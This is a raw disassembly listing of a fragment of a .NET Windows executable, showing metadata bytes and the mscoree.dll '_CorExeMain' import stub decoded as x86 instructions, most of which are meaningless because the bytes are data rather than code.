  40cfef:	11 82 65 0b 07 06    	adc    %eax,0x6070b65(%edx)
  40cff5:	12 60 1d             	adc    0x1d(%eax),%ah
  40cff8:	0e                   	push   %cs
  40cff9:	0e                   	push   %cs
  40cffa:	08 12                	or     %dl,(%edx)
  40cffc:	60                   	pusha
  40cffd:	08 05 07 01 12 81    	or     %al,0x81120107
  40d003:	2d 05 07 01 12       	sub    $0x12010705,%eax
  40d008:	81 71 07 07 04 05 1d 	xorl   $0x1d050407,0x7(%ecx)
  40d00f:	05 08 08 06 00       	add    $0x60808,%eax
  40d014:	02 07                	add    (%edi),%al
  40d016:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d01b:	02 0c 1d 05 08 06 00 	add    0x60805(,%ebx,1),%cl
  40d022:	02 0d 1d 05 08 06    	add    0x608051d,%cl
  40d028:	00 02                	add    %al,(%edx)
  40d02a:	09 1d 05 08 06 00    	or     %ebx,0x60805
  40d030:	02 0b                	add    (%ebx),%cl
  40d032:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d037:	02 06                	add    (%esi),%al
  40d039:	1d 05 08 06 00       	sbb    $0x60805,%eax
  40d03e:	02 0a                	add    (%edx),%cl
  40d040:	1d 05 08 09 07       	sbb    $0x7090805,%eax
  40d045:	03 12                	add    (%edx),%edx
  40d047:	81 2d 1d 05 1d 05 05 	subl   $0x12020705,0x51d051d
  40d04e:	07 02 12 
  40d051:	60                   	pusha
  40d052:	02 04 07             	add    (%edi,%eax,1),%al
  40d055:	01 1d 05 05 07 02    	add    %ebx,0x2070505
  40d05b:	1d 05 08 08 07       	sbb    $0x7080805,%eax
  40d060:	04 1d                	add    $0x1d,%al
  40d062:	05 1d 05 08 05       	add    $0x508051d,%eax
  40d067:	06                   	push   %es
  40d068:	07                   	pop    %es
  40d069:	03 1d 05 08 05 05    	add    0x5050805,%ebx
  40d06f:	00 01                	add    %al,(%ecx)
  40d071:	1d 05 0b 0f 07       	sbb    $0x70f0b05,%eax
  40d076:	06                   	push   %es
  40d077:	12 81 2d 1d 05 08    	adc    0x8051d2d(%ecx),%al
  40d07d:	12 82 69 1d 05 1d    	adc    0x1d051d69(%edx),%al
  40d083:	05 08 20 02 01       	add    $0x1022008,%eax
  40d088:	12 61 11             	adc    0x11(%ecx),%ah
  40d08b:	82 6d 0c 07          	subb   $0x7,0xc(%ebp)
  40d08f:	04 12                	add    $0x12,%al
  40d091:	81 2d 1d 05 12 82 69 	subl   $0x51d69,0x8212051d
  40d098:	1d 05 00 
  40d09b:	00 c4                	add    %al,%ah
  40d09d:	d0 00                	rolb   $1,(%eax)
	...
  40d0a7:	00 de                	add    %bl,%dh
  40d0a9:	d0 00                	rolb   $1,(%eax)
  40d0ab:	00 00                	add    %al,(%eax)
  40d0ad:	20 00                	and    %al,(%eax)
	...
  40d0c3:	00 d0                	add    %dl,%al
  40d0c5:	d0 00                	rolb   $1,(%eax)
	...
  40d0cf:	00 00                	add    %al,(%eax)
  40d0d1:	00 5f 43             	add    %bl,0x43(%edi)
  40d0d4:	6f                   	outsl  %ds:(%esi),(%dx)
  40d0d5:	72 45                	jb     0x40d11c
  40d0d7:	78 65                	js     0x40d13e
  40d0d9:	4d                   	dec    %ebp
  40d0da:	61                   	popa
  40d0db:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40d0e2:	72 65                	jb     0x40d149
  40d0e4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40d0e8:	6c                   	insb   (%dx),%es:(%edi)
  40d0e9:	00 00                	add    %al,(%eax)
  40d0eb:	00 00                	add    %al,(%eax)
  40d0ed:	00 ff                	add    %bh,%bh
  40d0ef:	25 00 20 40 00       	and    $0x402000,%eax
